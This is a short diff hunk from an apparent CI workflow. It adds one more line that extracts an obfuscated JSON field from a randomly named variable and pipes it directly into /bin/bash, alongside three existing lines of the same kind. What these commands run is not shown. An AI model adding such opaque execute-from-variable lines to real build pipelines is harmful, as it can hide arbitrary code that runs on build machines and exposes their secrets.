@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$tx3" | jq -r .pes57332 | /bin/bash
           echo $b131 | jq -r .yrp6892 | /bin/bash
           echo $qibv9 | jq -r .qa1358 | /bin/bash
+          echo $zdtje01 | jq -r .je5 | /bin/bash
 
       - name: Archive output
         if: always()
